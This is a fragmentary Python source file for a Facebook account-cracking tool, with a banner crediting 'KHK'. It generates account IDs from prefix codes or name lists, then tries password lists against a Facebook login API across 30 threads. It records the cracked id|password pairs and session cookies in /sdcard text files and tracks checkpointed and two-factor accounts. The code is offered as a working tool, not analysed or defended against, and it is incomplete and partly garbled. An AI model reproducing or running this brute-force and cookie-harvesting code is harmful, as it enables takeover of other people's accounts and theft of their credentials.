...
\033[1;92m / ,<  / /_/ / ,<\033[0m
\033[1;92m/ /| |/ __  / /| |\033[0m
\033[1;93m/_/ |_/_/ /_/_/ |_| \033[0m
                                        
\033[1;91m-------------------------------------\033[0m
[📍] \033[1;92mAuthor\033[0m   :\033[1;92mKHK\033[0m
[📍]\033[1;92m Facebook\033[0m :\033[1;93mKaungHtetKaung\033[0m
[📍] \033[1;92mTool\033[0m     :\033[1;93mPREMIUM\033[0m
[📍] \033[1;92mVersion  :\033[0m\033[1;92m1.0\033[0m
\033[1;94m--------------------------------------""")
def linex():
	print('\033[1;92m--------------------------------------')
def clear():
...
def pak():
		...
		with tred(max_workers=30) as TRT:	
			...
			print(' \033[1;92mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
				...
				if mthd in ['1','01']:
					KHK.submit(trt1,ids,passlist)
				if mthd in ['2','02']:
					KHK.submit(trt2,ids,passlist)
				if mthd in ['3','03']:
					KHK.submit(trt3,ids,passlist)
				if mthd in ['4','04']:
					KHK.submit(trt4,ids,passlist)
				if mthd in ['5','05']:
					KHK.submit(trt5,ids,passlist)
				if mthd in ['6','06']:
					KHK.submit(trt6,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
		...
		clear()
		print('\033[1;92m example: ramzan, ali, sajjad, faizan\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;92m example: khan, ahmad, ali \033[1;97m')
		linex()
		...
		with tred(max_workers=30) as TRT:
			total = str(len(fo))
			clear()
			print(' Total ids : \033[1;92m'+total+f' ')
			print(' \033[1;92mThe process is running in the background')
			linex()
			for user in fo:
				ids,names = user.split('|')
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;93+\033 [kHK-M1] %s|\033[1;93mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;92m [KHK-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/KHK-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\033[1;93m [KHK-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/KHK-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/KHK-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;92m ["KHK-M2] %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [KHK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/KHK-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KHK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[KHK-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;92m [KHK-M3] %s|\033[1;91mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;91m [KHK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/KHK-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/KHK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;92m [KHK-M4] %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
